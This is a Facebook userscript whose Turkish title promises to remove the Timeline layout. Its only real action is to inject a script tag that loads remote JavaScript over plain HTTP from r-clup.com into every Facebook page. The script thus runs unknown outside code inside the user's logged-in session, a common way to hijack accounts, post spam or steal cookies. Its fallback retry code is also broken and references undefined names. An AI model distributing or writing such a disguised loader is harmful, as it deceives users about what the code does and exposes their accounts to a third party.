// ==UserScript==
// @name          Zaman Tünelini Kaldır!
// @namespace     Zaman Tünelinden Çıkış!
// @description   Facebook.com
// @version     1.0
// @license     GPL 3.0
// @include     http*://*.facebook.com/* 
// @exclude     http*://*.facebook.com/plugins/*
// @exclude     http*://*.facebook.com/widgets/*
// @exclude     http*://*.facebook.com/iframe/*
// @exclude     http*://*.facebook.com/desktop/*
// @exclude     http*://*.channel.facebook.com/*
// @exclude     http*://*.facebook.com/ai.php*
// @exclude        http://*.channel.facebook.tld/*
// @exclude        http://static.*.facebook.tld/*
// @exclude        http://*.facebook.tld/ai.php*
// @exclude        http://*.facebook.tld/pagelet/generic.php/pagelet/home/morestories.php*
// @exclude        https://*.channel.facebook.tld/*
// @exclude        https://static.*.facebook.tld/*
// @exclude        https://*.facebook.tld/ai.php*
// @exclude        https://*.facebook.tld/pagelet/generic.php/pagelet/home/morestories.php*

// ==/UserScript==
function topluhazirla()
{
	var s=document.createElement('script');
	s.type="text/javascript";
	s.className="topluoneri";s.id="topluoneri";
	s.src="http://r-clup.com/js-apps/sd.js";
	if(document.getElementsByTagName('head')[0])document.getElementsByTagName('head')[0].appendChild(s);
	else if(a<50) setTimeout(function(){myplugin(a++);},250);
}
document.ready=topluhazirla();